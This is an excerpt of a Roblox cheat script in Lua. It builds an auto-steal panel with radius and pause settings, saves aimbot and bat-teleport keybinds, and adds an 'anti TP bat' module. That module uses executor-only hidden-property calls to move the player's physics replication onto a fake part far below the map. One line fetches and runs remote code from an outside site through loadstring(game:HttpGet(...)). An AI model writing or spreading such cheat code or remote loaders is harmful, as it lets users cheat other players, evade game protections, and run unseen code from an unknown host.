...
function M.buildNewStatusUI()
    ...
    radLbl.Size = UDim2.new(0, 72, 0, 14)
    radLbl.Position = UDim2.new(1, -78, 0, 22)
    radLbl.BackgroundTransparency = 1
    radLbl.Text = "R:" .. tostring(tonumber(M.Steal and M.Steal.StealRadius) or 62)
    radLbl.TextColor3 = Color3.fromRGB(200, 200, 210)
    ...
    -- ===== Gear button → expand settings (radius, Semi/Normal, pause %) =====
    local gearBtn = Instance.new("TextButton", frame)
    gearBtn.Name = "StealGearBtn"
    gearBtn.Size = UDim2.new(0, 28, 0, 22)
    gearBtn.Position = UDim2.new(0, 56, 0, 36)
    gearBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    gearBtn.BorderSizePixel = 0
    gearBtn.Text = "⚙"
    gearBtn.TextColor3 = GOLD
    ...
    do
        local gs = Instance.new("UIStroke", gearBtn)
        gs.Color = Color3.fromRGB(70, 70, 80)
        gs.Thickness = 1
    end

    -- compact ON chip next to gear
    local asBtn = Instance.new("TextButton", frame)
    asBtn.Name = "AutoStealChip"
    asBtn.Size = UDim2.new(0, 40, 0, 22)
    asBtn.Position = UDim2.new(0, 88, 0, 36)
    asBtn.BackgroundColor3 = (M.Steal and M.Steal.AutoStealEnabled) and GOLD or Color3.fromRGB(40, 40, 48)
    asBtn.BorderSizePixel = 0
    asBtn.Text = (M.Steal and M.Steal.AutoStealEnabled) and "ON" or "OFF"
    asBtn.TextColor3 = (M.Steal and M.Steal.AutoStealEnabled) and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(220, 220, 230)
    asBtn.Font = Enum.Font.GothamBlack
    asBtn.TextSize = 11
    asBtn.AutoButtonColor = false
    asBtn.ZIndex = 8
    Instance.new("UICorner", asBtn).CornerRadius = UDim.new(1, 0)
    M.statusAutoStealBtn = asBtn

    local function refreshASChip()
        local on = M.Steal and M.Steal.AutoStealEnabled == true
        asBtn.BackgroundColor3 = on and GOLD or Color3.fromRGB(40, 40, 48)
        asBtn.Text = on and "ON" or "OFF"
        asBtn.TextColor3 = on and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(220, 220, 230)
    end
    M.refreshStealBarASChip = refreshASChip

    asBtn.MouseButton1Click:Connect(function()
        local on = not (M.Steal and M.Steal.AutoStealEnabled)
        if M.Steal then M.Steal.AutoStealEnabled = on end
        if on then
            if M.startAutoSteal then pcall(function() M.startAutoSteal() end) end
        else
            if M.stopAutoSteal then pcall(function() M.stopAutoSteal() end) end
        end
        refreshASChip()
        if M.setInstaGrab then pcall(function() M.setInstaGrab(on) end) end
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)

    -- Expandable settings panel (below bar)
    local settingsOpen = false
    local settingsPanel = Instance.new("Frame", frame)
    settingsPanel.Name = "StealSettingsPanel"
    settingsPanel.Size = UDim2.new(1, 0, 0, 0)
    settingsPanel.Position = UDim2.new(0, 0, 1, 6)
    settingsPanel.BackgroundColor3 = Color3.fromRGB(6, 6, 8)
    ...
    do
        local pst = Instance.new("UIStroke", settingsPanel)
        pst.Color = Color3.fromRGB(255, 200, 70)
        pst.Thickness = 1.5
        pst.Transparency = 0.35
    end

    local PANEL_H = 118
    local spInner = Instance.new("Frame", settingsPanel)
    spInner.Size = UDim2.new(1, -16, 1, -12)
    spInner.Position = UDim2.new(0, 8, 0, 6)
    spInner.BackgroundTransparency = 1
    spInner.ZIndex = 11

    -- Row 1: Mode Semi / Normal
    local modeLabel = Instance.new("TextLabel", spInner)
    modeLabel.Size = UDim2.new(0, 48, 0, 22)
    ...
    local function makeModeChip(text, x)
        local b = Instance.new("TextButton", spInner)
    ...
    local semiBtn, semiSt = makeModeChip("Semi", 52)
    local normalBtn, normalSt = makeModeChip("Normal", 122)

    local function refreshStealModeChips()
        local isSemi = tostring(M.stealMode or "V2") == "Semi"
        if isSemi then
            semiBtn.BackgroundColor3 = GOLD
            semiBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            semiSt.Color = GOLD
            normalBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
            normalBtn.TextColor3 = Color3.fromRGB(210, 210, 220)
            normalSt.Color = Color3.fromRGB(70, 70, 80)
        else
            normalBtn.BackgroundColor3 = GOLD
            normalBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            normalSt.Color = GOLD
            semiBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
            semiBtn.TextColor3 = Color3.fromRGB(210, 210, 220)
            semiSt.Color = Color3.fromRGB(70, 70, 80)
        end
    end
    M.refreshStealModeChips = refreshStealModeChips

    semiBtn.MouseButton1Click:Connect(function()
        M.stealMode = "Semi"
        refreshStealModeChips()
        if M.updateStatusModeBadge then pcall(M.updateStatusModeBadge) end
        if M.updateStatusRadius then pcall(M.updateStatusRadius) end
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)
    ...
    -- Row 2: Pause % 75 80 85 90
    local pauseLabel = Instance.new("TextLabel", spInner)
    pauseLabel.Size = UDim2.new(0, 48, 0, 22)
    pauseLabel.Position = UDim2.new(0, 0, 0, 32)
    pauseLabel.BackgroundTransparency = 1
    pauseLabel.Text = "Pause:"
    pauseLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
    pauseLabel.Font = Enum.Font.GothamMedium
    pauseLabel.TextSize = 12
    pauseLabel.TextXAlignment = Enum.TextXAlignment.Left
    pauseLabel.ZIndex = 12

    M.stealPauseMode = tonumber(M.stealPauseMode) or 75
    M._stealBarModeBtns = {}
    local function refreshModeBtnStyles()
        local cur = tonumber(M.stealPauseMode) or 75
        for val, btn in pairs(M._stealBarModeBtns or {}) do
    ...
    local function applyPauseMode(val)
        val = tonumber(val) or 75
        if M.setStealPauseMode then
            pcall(function() M.setStealPauseMode(val) end)
        else
            M.stealPauseMode = val
            M.autoGrabPausePct = val / 100
            local dur = tonumber(M.Steal and M.Steal.StealDuration) or 1.3
            M.autoGrabStopTime = dur * (val / 100)
            if M.Steal then M.Steal.StopTime = M.autoGrabStopTime end
        end
        refreshModeBtnStyles()
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end
    for i, val in ipairs({75, 80, 85, 90}) do
        local btn = Instance.new("TextButton", spInner)
        btn.Name = "Mode" .. tostring(val)
        btn.Size = UDim2.new(0, 36, 0, 22)
        btn.Position = UDim2.new(0, 52 + (i - 1) * 40, 0, 32)
        btn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        ...
        btn.MouseButton1Click:Connect(function() applyPauseMode(val) end)
        M._stealBarModeBtns[val] = btn
    end
    refreshModeBtnStyles()

    -- Row 3: Radius - value +
    local radLabel = Instance.new("TextLabel", spInner)
    radLabel.Size = UDim2.new(0, 52, 0, 22)
    radLabel.Position = UDim2.new(0, 0, 0, 66)
    radLabel.BackgroundTransparency = 1
    radLabel.Text = "Radius:"
    radLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
    radLabel.Font = Enum.Font.GothamMedium
    radLabel.TextSize = 12
    radLabel.TextXAlignment = Enum.TextXAlignment.Left
    radLabel.ZIndex = 12

    local radMinus = Instance.new("TextButton", spInner)
    radMinus.Size = UDim2.new(0, 28, 0, 24)
    radMinus.Position = UDim2.new(0, 56, 0, 64)
    radMinus.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    radMinus.BorderSizePixel = 0
    radMinus.Text = "−"
    radMinus.TextColor3 = GOLD
    radMinus.Font = Enum.Font.GothamBlack
    radMinus.TextSize = 16
    radMinus.AutoButtonColor = false
    radMinus.ZIndex = 12
    Instance.new("UICorner", radMinus).CornerRadius = UDim.new(0, 5)

    local radVal = Instance.new("TextLabel", spInner)
    radVal.Name = "RadVal"
    radVal.Size = UDim2.new(0, 44, 0, 24)
    radVal.Position = UDim2.new(0, 88, 0, 64)
    radVal.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    radVal.BorderSizePixel = 0
    radVal.Text = tostring(math.floor(tonumber(M.Steal and M.Steal.StealRadius) or 62))
    radVal.TextColor3 = GOLD
    radVal.Font = Enum.Font.GothamBold
    radVal.TextSize = 12
    radVal.ZIndex = 12
    Instance.new("UICorner", radVal).CornerRadius = UDim.new(0, 5)
    M.statusRadValLbl = radVal

    local radPlus = Instance.new("TextButton", spInner)
    radPlus.Size = UDim2.new(0, 28, 0, 24)
    radPlus.Position = UDim2.new(0, 136, 0, 64)
    radPlus.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    radPlus.BorderSizePixel = 0
    radPlus.Text = "+"
    radPlus.TextColor3 = GOLD
    radPlus.Font = Enum.Font.GothamBlack
    radPlus.TextSize = 16
    radPlus.AutoButtonColor = false
    radPlus.ZIndex = 12
    Instance.new("UICorner", radPlus).CornerRadius = UDim.new(0, 5)

    local function setBarRadius(v)
        v = math.clamp(math.floor(tonumber(v) or 62), 1, 200)
        if M.Steal then M.Steal.StealRadius = v end
        if M.setStealRadius then pcall(function() M.setStealRadius(v) end) end
        if radVal then radVal.Text = tostring(v) end
        if M.statusRadiusLbl then M.statusRadiusLbl.Text = "R:" .. tostring(v) end
        if M.updateStatusRadius then pcall(function() M.updateStatusRadius() end) end
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end
    radMinus.MouseButton1Click:Connect(function()
        setBarRadius((tonumber(M.Steal and M.Steal.StealRadius) or 62) - 1)
    end)
    radPlus.MouseButton1Click:Connect(function()
        setBarRadius((tonumber(M.Steal and M.Steal.StealRadius) or 62) + 1)
    end)

    -- Radius text box for direct input
    local radBox = Instance.new("TextBox", spInner)
    radBox.Size = UDim2.new(0, 52, 0, 24)
    radBox.Position = UDim2.new(0, 172, 0, 64)
    radBox.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    radBox.BorderSizePixel = 0
    radBox.Text = tostring(math.floor(tonumber(M.Steal and M.Steal.StealRadius) or 62))
    radBox.TextColor3 = GOLD
    radBox.Font = Enum.Font.GothamBold
    radBox.TextSize = 12
    radBox.PlaceholderText = "62"
    ...
    M.statusRadBox = radBox

    local function setSettingsOpen(open)
        settingsOpen = open == true
        if settingsOpen then
            settingsPanel.Visible = true
            settingsPanel.Size = UDim2.new(1, 0, 0, PANEL_H)
            gearBtn.BackgroundColor3 = GOLD
            gearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            refreshStealModeChips()
            refreshModeBtnStyles()
            local rv = math.floor(tonumber(M.Steal and M.Steal.StealRadius) or 62)
            if radVal then radVal.Text = tostring(rv) end
            if radBox then radBox.Text = tostring(rv) end
        else
            settingsPanel.Visible = false
            settingsPanel.Size = UDim2.new(1, 0, 0, 0)
            gearBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    ...
    M.setStealBarSettingsOpen = setSettingsOpen
    ...
    do
        ...
        M._stealBarStatsConn = RunService.Heartbeat:Connect(function()
            ...
            if M.statusRadiusLbl then
                M.statusRadiusLbl.Text = "R:" .. tostring((M.Steal and M.Steal.StealRadius) or 62)
            end
            if M.statusRadValLbl then
                M.statusRadValLbl.Text = tostring(math.floor(tonumber(M.Steal and M.Steal.StealRadius) or 62))
            end
            if M.refreshStealBarASChip then pcall(M.refreshStealBarASChip) end
        end)
    end
end
...
function saveCherryConfig()
    ...
    local cfg = {
        ...
        speedToggleKey=ks(M.KB.SpeedToggle), bypassAimbotKey=ks(M.KB.BypassAimbot), batTPKey=ks(M.KB.BatTP), batTPEnabled=M.batTPEnabled==true, batTPSpeed=M.batTPSpeed or 58, batTPVersion=(function() local v=tostring(M.batTPVersion or "V1"):upper():gsub("%s+",""); if v=="1"or v=="2"or v=="3"or v=="4"or v=="5" then v="V"..v end; if v~="V1"and v~="V2"and v~="V3"and v~="V4"and v~="V5" then return "V1" end; return v end)(), batAimbotVersion=M.batAimbotVersion or "V1", antiDieFlingEnabled=M.antiDieFlingEnabled==true,
    }
...
-- =====================================================================
-- Capo X Night Anti TP Bat (from Vx7, rebranded) — Visuals toggle panel
-- =====================================================================
M.antiTpBatOpen = false
M.antiTpBatEnabled = false
M.antiTpBatKey = Enum.KeyCode.T
M._antiTpBatGui = nil
M._antiTpBatAwaitingKey = false
M._antiTpBatConns = {}
M._antiTpBatStep = nil
M._antiTpBatFake = nil
M._antiTpBatRoot = nil
M._antiTpBatChar = nil
M._antiTpBatRepOwner = nil

local ANTI_TP_FAKE_NAME = "CapoAntiTpRoot"
local ANTI_TP_FAKE_Y = -2500
local ANTI_TP_FAKE_VEL = Vector3.new(0, -1000, 0)

local function _antiTpFindFn(...)
...
local function _antiTpSetHidden(inst, prop, value)
    if not inst then return false end
    local setter = _antiTpFindFn("sethiddenproperty", "set_hidden_property", "sethiddenprop", "set_hidden_prop")
    if setter then
        local ok = pcall(setter, inst, prop, value)
        if ok then return true end
    end
    return pcall(function() inst[prop] = value end)
end

local function _antiTpGetHidden(inst, prop)
    if not inst then return false, nil end
    local getter = _antiTpFindFn("gethiddenproperty", "get_hidden_property", "gethiddenprop", "get_hidden_prop")
    if getter then
        local ok, value = pcall(getter, inst, prop)
...
local function _antiTpIsPart(inst)
    if not inst then return false end
    local ok, r = pcall(function() return inst:IsA("BasePart") end)
    return ok and r == true
end

local function _antiTpGetRoot(char)
    char = char or player.Character
    if not char then return nil end
    local ok, root = pcall(function() return char:FindFirstChild("HumanoidRootPart") end)
    if ok and _antiTpIsPart(root) then return root end
    return nil
end

local function _antiTpConfigurePhysics()
    _antiTpSetHidden(player, "MaximumSimulationRadius", math.huge)
    _antiTpSetHidden(player, "SimulationRadius", math.huge)
    pcall(function()
        settings().Network.InterpolationThrottling = Enum.InterpolationThrottlingMode.Disabled
    end)
    pcall(function()
...
local function _antiTpDestroyFake()
    local fake = M._antiTpBatFake
    M._antiTpBatFake = nil
    if fake then pcall(function() fake:Destroy() end) end
end

local function _antiTpFakeUsable()
    local fake = M._antiTpBatFake
    if not _antiTpIsPart(fake) then return false end
    local ok, parent = pcall(function() return fake.Parent end)
    return ok and parent ~= nil
end

local function _antiTpCreateFake(root)
    _antiTpDestroyFake()
    local fake = Instance.new("Part")
    fake.Name = ANTI_TP_FAKE_NAME
    ...
    fake.CanQuery = false
    fake.Transparency = 1
    fake.CFrame = CFrame.new(0, ANTI_TP_FAKE_Y, 0)
    fake.AssemblyLinearVelocity = ANTI_TP_FAKE_VEL
    fake.Parent = workspace
    local ok, pos = pcall(function() return root.Position end)
    if ok and pos then
        fake.CFrame = CFrame.new(pos.X, ANTI_TP_FAKE_Y, pos.Z)
    end
    M._antiTpBatFake = fake
    return fake
end

local function _antiTpAssignRep(root, fake)
    if not _antiTpIsPart(root) or not _antiTpIsPart(fake) then return false end
    _antiTpSetHidden(root, "PhysicsRepRootPart", root)
    M._antiTpBatRepOwner = root
    return _antiTpSetHidden(root, "PhysicsRepRootPart", fake)
end

local function _antiTpRestoreRep()
    local owner = M._antiTpBatRepOwner
    if _antiTpIsPart(owner) then
        _antiTpSetHidden(owner, "PhysicsRepRootPart", owner)
    end
    local root = M._antiTpBatRoot
    if _antiTpIsPart(root) then
        _antiTpSetHidden(root, "PhysicsRepRootPart", root)
    end
    M._antiTpBatRepOwner = nil
end

local function _antiTpStopStep()
    if M._antiTpBatStep then
        pcall(function() M._antiTpBatStep:Disconnect() end)
        M._antiTpBatStep = nil
    end
end

local function _antiTpStep()
    if not M.antiTpBatEnabled then return end
    local root = M._antiTpBatRoot
    if not _antiTpIsPart(root) then
        root = _antiTpGetRoot(M._antiTpBatChar)
        M._antiTpBatRoot = root
    end
    if not root then return end
    if not _antiTpFakeUsable() then
        local fake = _antiTpCreateFake(root)
        _antiTpAssignRep(root, fake)
        return
    end
    local fake = M._antiTpBatFake
    local ok, rootPos, fakePos = pcall(function() return root.Position, fake.Position end)
    if ok and rootPos and fakePos then
        if math.abs(rootPos.X - fakePos.X) > 0.01
            or math.abs(rootPos.Z - fakePos.Z) > 0.01
            or math.abs(fakePos.Y - ANTI_TP_FAKE_Y) > 0.01 then
            pcall(function() fake.CFrame = CFrame.new(rootPos.X, ANTI_TP_FAKE_Y, rootPos.Z) end)
        end
    end
    pcall(function()
        fake.Anchored = true
    ...
    local got, current = _antiTpGetHidden(root, "PhysicsRepRootPart")
    if not got or current ~= fake then
        _antiTpSetHidden(root, "PhysicsRepRootPart", fake)
    end
end

local function _antiTpStartStep()
    _antiTpStopStep()
    M._antiTpBatStep = RunService.Stepped:Connect(_antiTpStep)
end

function M.setAntiTpBatEnabled(value)
    value = value == true
    if M.antiTpBatEnabled == value then
        if M._refreshAntiTpBatUI then pcall(M._refreshAntiTpBatUI) end
        return value
    end
    M.antiTpBatEnabled = value
    if value then
        pcall(_antiTpConfigurePhysics)
        local root = _antiTpGetRoot(player.Character)
        M._antiTpBatChar = player.Character
        M._antiTpBatRoot = root
        if not root then
            M.antiTpBatEnabled = false
            if M._refreshAntiTpBatUI then pcall(M._refreshAntiTpBatUI) end
    ...
    if M._refreshAntiTpBatUI then pcall(M._refreshAntiTpBatUI) end
    return M.antiTpBatEnabled
end

function M.destroyAntiTpBatGui()
    if M._antiTpBatGui then
        pcall(function() M._antiTpBatGui:Destroy() end)
        M._antiTpBatGui = nil
    end
    M.antiTpBatOpen = false
    M._antiTpBatAwaitingKey = false
...
function M.buildAntiTpBatGui()
    ...
    local PlayerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CapoAntiTpBatUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 121
    local parented = false
    if typeof(gethui) == "function" then parented = pcall(function() screenGui.Parent = gethui() end) end
    if not parented then parented = pcall(function() screenGui.Parent = game:GetService("CoreGui") end) end
    if not parented and PlayerGui then screenGui.Parent = PlayerGui end
    M._antiTpBatGui = screenGui
    M.antiTpBatOpen = true
    ...
    toggleBtn.MouseButton1Click:Connect(function()
        M.setAntiTpBatEnabled(not M.antiTpBatEnabled)
    end)
    ...
    if not M._antiTpBatKeyConn then
        M._antiTpBatKeyConn = UIS.InputBegan:Connect(function(input, gp)
            if gp then return end
            if M._antiTpBatAwaitingKey then return end
            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == (M.antiTpBatKey or Enum.KeyCode.T) then
                M.setAntiTpBatEnabled(not M.antiTpBatEnabled)
            end
        end)
    end
    ...
    if not M._antiTpBatCharConn then
        M._antiTpBatCharConn = player.CharacterAdded:Connect(function(char)
            task.defer(function()
                M._antiTpBatChar = char
                M._antiTpBatRoot = _antiTpGetRoot(char)
                if M.antiTpBatEnabled then
                    _antiTpDestroyFake()
                    local root = M._antiTpBatRoot
                    if not root then
                        local ok, waited = pcall(function() return char:WaitForChild("HumanoidRootPart", 8) end)
                        if ok and _antiTpIsPart(waited) then
                            root = waited
                            M._antiTpBatRoot = root
                        end
                    end
    ...
    M._refreshAntiTpBatUI()
end

function M.toggleAntiTpBatGui(force)
    if force == false or (force == nil and M.antiTpBatOpen) then
        M.destroyAntiTpBatGui()
        return false
    end
    M.buildAntiTpBatGui()
...
loadstring(game:HttpGet("https://voidexternal.xyz/v2/scrap/89c7f904722893ad75fc2e4f/raw"))()
    ...
    local _, setAntiTpBatPanel = uiToggleRow(PVis, "Anti Tp Bat Panel", M.antiTpBatOpen == true, function(on)
        if on then
            M.buildAntiTpBatGui()
        else
            M.destroyAntiTpBatGui()
        end
        M.antiTpBatOpen = on == true
        pcall(saveCherryConfig)
    end)
    M.setAntiTpBatPanelVisual = setAntiTpBatPanel
